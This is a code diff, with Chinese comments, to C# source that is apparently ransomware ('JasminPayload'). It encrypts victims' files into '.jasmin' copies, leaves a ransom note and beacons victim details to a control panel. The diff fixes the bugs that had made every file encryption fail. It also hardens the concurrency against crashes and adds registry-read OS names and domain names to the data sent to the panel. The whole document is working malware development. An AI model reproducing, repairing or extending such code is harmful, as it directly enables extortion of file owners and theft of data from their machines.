@@ -8,6 +8,7 @@ using System.Threading;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Collections.Specialized;
+using Microsoft.Win32;
 
 namespace JasminPayload {
 class P {
@@ -143,10 +144,24 @@ static RSAParameters ParseRsaPublicKey(string pem){
 }
 
 static RSAParameters _PUB_PARAMS;
-static bool _PUB_READY=false;
+static volatile bool _PUB_READY=false;
+static readonly object _PUB_LK=new object();
+static void WarmPublicKey(){
+  lock(_PUB_LK){ if(!_PUB_READY){ _PUB_PARAMS=ParseRsaPublicKey(PUB); _PUB_READY=true; } }
+}
+// ★★ 致命缺陷修复 ★★ .NET Framework 的 RSA.Create() 返回 RSACryptoServiceProvider，
+//   它只支持 PKCS#1 v1.5 与 OAEP-SHA1；传 RSAEncryptionPadding.OaepSHA256 必然抛
+//     CryptographicException: Specified padding mode is not valid for this algorithm.
+//   -> Enc() 里 RsaEnc 先抛，9 个文件 0 个加密成功（实测 Server 2019 / .NET 4.8）。
+//   实测对照：[1] RSA.Create()->RSACryptoServiceProvider 失败
+//             [2] RSACng + OaepSHA256 -> 成功 len=256，产物经平台私钥
+//                 openssl -pkeyopt rsa_oaep_md:sha256 解密与原文 48/48 字节全等
+//   RSACng 在 Windows / .NET Framework 4.6+ 上始终可用。
+//   另：原来对 _PUB_PARAMS 的惰性初始化是多线程数据竞争（并发任务同时进 if），
+//   改为加锁 + 主线程预热。
 static byte[] RsaEnc(byte[] data){
-  if(!_PUB_READY){_PUB_PARAMS=ParseRsaPublicKey(PUB);_PUB_READY=true;}
-  using(var rsa=RSA.Create()){rsa.ImportParameters(_PUB_PARAMS);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}
+  if(!_PUB_READY)WarmPublicKey();
+  using(var rsa=new RSACng()){rsa.ImportParameters(_PUB_PARAMS);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}
 
 static System.Collections.Generic.Dictionary<string,int> FAILS=new System.Collections.Generic.Dictionary<string,int>();
 static void NoteFail(string why){lock(FAILS){int v;FAILS.TryGetValue(why,out v);FAILS[why]=v+1;}}
@@ -209,6 +224,9 @@ static bool Enc(string path){
     }
     else w=ex.GetType().Name+": "+ex.Message;
     NoteFail(w);
+    // 半成品清理：FileStream(Create) 已把 .jasmin 建出来了，异常时不删就会留下
+    // 0 字节/半截的孤儿文件（白占空间，也会被面板的统计当成真实产物）。
+    try{ string part=path+".jasmin"; if(File.Exists(part))File.Delete(part); }catch{}
     return false;
   }}
 
@@ -266,6 +284,20 @@ static void Tick(string path,long size,bool ok){
   }
 }
 
+// 面板 os 字段原先取 Environment.OSVersion.Version：不带应用程序清单时拿到的是内核
+// 版本（Server 2019 显示成 "Windows 6.2.9200.0"），对取证毫无意义。改读注册表。
+static string OSName(){
+  try{
+    using(var k=Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")){
+      if(k!=null){
+        string p=(k.GetValue("ProductName")as string)??"";
+        string d=(k.GetValue("DisplayVersion")as string)??"";
+        if(p.Length>0)return d.Length>0?(p+" ("+d+")"):p;
+      }
+    }
+  }catch{}
+  return Environment.OSVersion.VersionString;
+}
 static string _IP=null;
 static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool complete=true,int totalCnt=0,long totalSz=0){
   try{
@@ -276,8 +308,8 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool c
     string ip=_IP;
     var kv=new List<KeyValuePair<string,string>>{
       new KeyValuePair<string,string>("machine_name",m),new KeyValuePair<string,string>("computer_user",u),new KeyValuePair<string,string>("systemid",SID),
-      new KeyValuePair<string,string>("os","Windows "+Environment.OSVersion.Version),new KeyValuePair<string,string>("date",d),new KeyValuePair<string,string>("time",t),
-      new KeyValuePair<string,string>("ip",ip),new KeyValuePair<string,string>("location","?"),new KeyValuePair<string,string>("password","RSA_PROTECTED"),new KeyValuePair<string,string>("handshake",SECRET),
+      new KeyValuePair<string,string>("os",OSName()),new KeyValuePair<string,string>("date",d),new KeyValuePair<string,string>("time",t),
+      new KeyValuePair<string,string>("ip",ip),new KeyValuePair<string,string>("location",LOCATION),new KeyValuePair<string,string>("password","RSA_PROTECTED"),new KeyValuePair<string,string>("handshake",SECRET),
       new KeyValuePair<string,string>("encrypted_count",cnt.ToString()),new KeyValuePair<string,string>("encrypted_size",sz.ToString()),
       new KeyValuePair<string,string>("encrypted_types",types),new KeyValuePair<string,string>("encrypted_detail",detail),
       new KeyValuePair<string,string>("is_complete",complete?"1":"0"),
@@ -298,6 +330,7 @@ static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}",bool c
   }catch{}}}}
 
 static string SID="";
+static string LOCATION=Environment.UserDomainName;   // 原恒为 "?"，面板上零信息量
 static string NOTE=@"
 {{RANSOM_NOTE}}
 ";
@@ -363,6 +396,9 @@ static void Preflight(){
 }
 
 static void Main(){
+  // 主线程预热公钥：既让解析失败时立刻退出（而不是每个文件都失败一遍），
+  // 也消除并发任务对 _PUB_PARAMS 惰性初始化的竞态。
+  try{ WarmPublicKey(); }catch(Exception ex){ try{ Console.Error.WriteLine("[jasmin] !!! RSA public key unusable: "+ex.Message); }catch{} return; }
   SID=VolumeSerials();   // 见 VolumeSerials()：零依赖取卷序列号
 
   ScanTargets();
@@ -391,16 +427,18 @@ static void Main(){
             Tick(fc,fszc,ok);
             if(ok){lock(lk){encCount++;encSize+=fszc;
               try{string nd=Path.GetDirectoryName(fc);if(!string.IsNullOrEmpty(nd))NOTE_DIRS.Add(nd);}catch{}
-              string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
+              string e=Path.GetExtension(fc).ToLowerInvariant();  // ToLower() 受区域设置影响（土耳其 I/ı）encTypes.Add(e);
               if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
               typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
           }finally{P_SEM.Release();}
         }));
-        if(tasks.Count>=2048){System.Threading.Tasks.Task.WaitAll(tasks.ToArray());tasks.Clear();}
+        // 任务体只有 try/finally 没有 catch，原来 WaitAll 又在 try 之外：任一任务抛异常
+        // 都会冒泡成 AggregateException 直接打死进程（表现为“载荷刚起来就退出”，无任何线索）。
+        if(tasks.Count>=2048){try{System.Threading.Tasks.Task.WaitAll(tasks.ToArray());}catch(Exception ex){NoteFail("Task batch failed: "+ex.GetType().Name);}tasks.Clear();}
       });
     }catch{}
   }
-  System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
+  try{System.Threading.Tasks.Task.WaitAll(tasks.ToArray());}catch(Exception ex){NoteFail("Task batch failed (final): "+ex.GetType().Name);}
   if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] Encryption complete: "+encCount+"/"+P_TOTAL+" file(s), "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
   ReportFails();
 
